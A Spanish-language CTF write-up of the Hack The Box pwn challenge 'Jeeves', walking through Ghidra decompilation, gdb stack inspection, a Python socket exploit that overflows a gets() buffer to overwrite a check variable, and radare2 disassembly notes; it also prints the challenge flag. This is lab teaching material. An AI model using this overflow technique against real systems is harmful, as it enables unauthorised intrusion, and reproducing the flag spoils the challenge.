# Jeeves
---------------------------
# Part 1: Probando el programa

Descargamos el binario, le damos permisos de ejecucíon y lo ejecutamos:
```console
└─$ ./jeeves
Hello, good sir!
May I have your name? cucuxii
Hello cucuxii, hope you have a good day!
```

Sin abrir el binario parece que mete el nombre en una variable y luego lo printea. ¿Se puede acontecer un
buffer overflow?

```console
└─$ ./jeeves
Hello, good sir!
May I have your name? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
zsh: segmentation fault  ./jeeves

└─$ python3 -c "print('A'*74)" | ./jeeves 
Hello, good sir!...
zsh: segmentation fault  ./jeeves
```
Pero aquí no hay que manipular el RIP sino sobreescribir una varaible...

------------------------
# Part 2: Leyendo su código

Si abrimos el programa con el ghidra y cambiando los nombres de varaibles:
```c
undefined8 main(void) {
  char nombre [44];
  int archivo;
  void *contenido;
  int cambiame;
  
  cambiame = L'\xdeadc0d3';
  printf("Hello, good sir!\nMay I have your name? ");
  gets(nombre);
  printf("Hello %s, hope you have a good day!\n",nombre);
  if (cambiame == 0x1337bab3) {
    contenido = malloc(0x100);
    archivo = open("flag.txt",0);
    read(archivo,contenido,0x100);
    printf("Pleased to make your acquaintance. Here\'s a small gift: %s\n",contenido);
    close(archivo);
  } return 0;
}
```

Es decir si cabmiame es "0x1337bab3" nos printea la flag, pero nos lo pone como xdeadc0d3 y solo podemos manipular
"nombre"... Se cambiame está despues de nombre podriamos hacer que nombre fuera tan largo que sobrepasara su 
buffer de 44 bytes para sobreescribir "cambiame"

---------------------------------
# Part 3: Destripandolo con gdb

```console
└─$ gdb ./jeeves
gef➤  disas main:
	(...)
	0x00005555555551f5 <+12>:	mov    DWORD PTR [rbp-0x4],0xdeadc0d3
  	(...)
	0x0000555555555236 <+77>:   cmp    DWORD PTR [rbp-0x4],0x1337bab3
```

Si hacemos un breakpoint cuando compara:
```
gef➤  b *0x0000555555555236
gef➤  r
May I have your name? AAAA
gef➤  x/40x $rsp
0x7fffffffdf40:	0x41414141	0x00000000	0x00000000	0x00000000
0x7fffffffdf50:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffdf60:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffdf70:	0x00000000	0x00000000	0x00000000	0xdeadc0d3

gef➤  x/a $rbp-0x4
0x7fffffffdf7c:	0x1deadc0d3 # Encontramos el valor que nos decian

gef➤  p 0x7fffffffdf7c - 0x7fffffffdf40
$4 = 0x3c (60)
```
La variable  a 60 bytes del rsp (de donde empezamos a escribir)

-----------------------------------
# Part 4: Desarrollando un exploit

Tenemos que mandar 60 "A"s + "0x1337bab3" (\xb3\xba\x37\x13 en bytes little endian)
```python
import socket

con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
con.connect(("165.227.231.233", 32634))
payload = b"A"*60 + b"\xb3\xba\x37\x13\n" 
con.send(payload)
print(con.recv(1024))
```
Tras la data hay un "\n" que se traduce como Enter (que es lo que haces en el programa cuando acabas de poner
el nombre)

```console
└─$ python3 exploit.py 
b"Hello, good sir!\nMay I have your name? Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb3\xba7\x13, hope you have a good day!\nPleased to make your acquaintance. Here's a small gift: HTB{w3lc0me_t0_lAnd_0f_pwn_&_pa1n!}\n\n"
```
------------------------------------------

# Extra: leyendo insutrcciones en codigo ensablador

Podriamos abrir el codigo en gdb pero prefiero radare2
```
int main (int argc, char **argv, char **envp);
	var char *s @ rbp-0x40;   # Donde mete el nombre
	var void *fildes @ rbp-0x14; # ???
	var char *buf @ rbp-0x10; #    ???
	var uint32_t var_4h @ rbp-0x4  ???

	# Crea la pila ->  [push rbp, mov rbp, rsp, sub rsp, 0x40]
    # mov dword [var_4h], 0xdeadc0d3  ## ??

	# Mete en RDI esta frase para pasarsela a printf()
	[lea rdi, str.Hello__good_sir__nMay_I_have_your_name__ mov eax, 0, call sym.imp.print]
	
	# Le pasa a gets un array de caracteres vacio (varaible nombre) mediante RDI
	[lea rax, [s], mov rdi, rax(char *s), mov eax, 0, call sym.imp.gets # char *gets(char *s)]
	
	# Vuelve a meter en RDI una cadena para printear
    [lea rax,[s],mov rsi,rax, lea rdi, str.Hello__s__hope_you_have_a_good_day__n, mov eax, 0,call sym.imp.printf]
	
	# Printea lo que estás escribiendo
	[mov eax, 0  call sym.imp.printf]

# Compara lo que hay en la varaible 4h con "0x1337bab3"
	# cmp dword [var_4h], 0x1337bab3
	# Si var_4h no es igual salta a 0x12a8 (mov eax, 0, ret, leave)
	# Si var_4h si es igual a esa cadena:
		[mov edi, 0x100, call sym.imp.malloc]  # void *malloc(size_t size)
		[mov qword [buf], rax, mov esi, 0, lea rdi, str.flag.txt]  # const char *path = "flag.txt"
		[mov eax, 0, call sym.imp.open  # 						   # open(path)
		[mov dword [fildes], eax, mov rcx, qword [buf], mov eax, dword [fildes]
		[mov edx, 0x100 (size_t nbyte), mov rsi, rcx (*buf), mov edi, eax (fildes), mov eax, 0, call sym.imp.read
		
		# contenido = read(fildes, void *buf, size_t nbyte)
		[mov rax, qword [buf], mov rsi, rax]
		[ea rdi, str.Pleased_to_make_your_acquaintance._Heres_a_small_gift: mov eax, 0, call sym.imp.printf]
		
		# printf(Pleased_to_make_your_acquaintance._Heres_a_small_gift -> contenido)
		[mov eax, 0, call sym.imp.printf]   (int printf(const char *format))
		[mov eax, dword [fildes], mov edi, eax, mov eax, 0, call sym.imp.close] # int close(int fildes)
```

Vemos claramente que en 64 bytes todos los argumentos de una funcion los pasa al registro  RDI (y si hay mas 
a RSI,RDX...) y luego llama a la funcion que lee de dicho registro/s. Esto se llama "calling conventions" y
es la manera que tienen los programas de 64 bits de operar

